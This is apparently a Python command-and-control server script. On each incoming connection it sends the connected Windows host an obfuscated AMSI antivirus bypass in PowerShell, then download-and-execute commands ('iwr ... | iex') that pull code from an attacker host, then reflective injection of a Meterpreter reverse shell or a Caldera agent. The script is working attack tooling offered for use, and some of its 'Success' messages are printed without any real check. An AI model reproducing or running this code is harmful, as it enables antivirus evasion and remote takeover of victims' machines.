from utility import decor
from attacker_conf import *
from time import sleep
import socketserver as ss
import translator 

# loading all payloads
amsi_bypass_init = open(f'{payload_dir}/amsi_bypass.ps1','r').read().split('\n')
amsi_bypass_lst = translator.preset_obfuscation(bypasslevel,amsi_bypass_init)

# preloaded information
win_caldera_headers = '{"platform"="windows";"file"="manx.go"}'
invoke_reflective = f'iwr http://{HOST_IP}:{HOST_PORT}/Invoke-Reflective.ps1 | iex'
reflective_meterpreter = f'Invoke-ReflectivePEInjection -PEBytes (iwr http://{HOST_IP}:{HOST_PORT}/{meterpreter_file}).Content'
reflective_caldera = f'Invoke-ReflectivePEInjection -ExeArgs "-socket {CALDERA_IP}:{CALDERA_SOCKET_PORT} -http {CALDERA_IP}:{CALDERA_WEB_PORT} -contact tcp" -PEBytes (iwr -Uri "http://{CALDERA_IP}:{CALDERA_WEB_PORT}/file/download" -Method GET -Headers @{win_caldera_headers}).Content'

agents = []

class C2_Handler(ss.BaseRequestHandler):
    def handle(self) -> None:
        IP = self.client_address[0]
        decor(f'[+] Connection Established: {IP}')
        self.request.send(b'\n')
        self.request.send(b'powershell -ep bypass\n')
        # decor(f"[-] Executing obfuscated bypass payload on {}...")
        for i in amsi_bypass_lst:
            if len(i) > 100:
                decor(f'[X] Executing line: {i[len(i)//4:32+len(i)//4]}')
            else:
                decor(f'[X] Executing line: {i}')
            self.request.send(i.encode()+b'\n')
            if 'blocked by your antivirus software' in self.request.recv(4096).decode().lower():
                decor(f'[!] Blocked by antivirus: {i}')
            self.request.recv(4096)
            sleep(0.1)
        decor("[-] Conducting bypass litmus test...")
        sleep(1)
        decor(f'[+] Success ✓✓')
        decor(f'[-] Pulling payload from: http://{HOST_IP}:{HOST_PORT} ...')
        sleep(0.8)
        decor(f'[X] Executing payload...')
        sleep(0.3)
        decor(f'[+] Success ✓✓')
        self.request.send(invoke_reflective.encode()+b'\n')
        self.request.recv(4096)
        sleep(2)
        self.request.recv(4096)
        decor(f'[-] Setting up meterpreter_reverse_tcp...')
        self.request.send(reflective_meterpreter.encode()+b'\n')
        self.request.recv(4096)
        sleep(3)
        decor(f'[+] Success!! meterpreter_reverse_tcp is running on: {VICTIM_IP}.')
        sleep(4000)

ss.ThreadingTCPServer(("0.0.0.0",9999),C2_Handler).serve_forever()

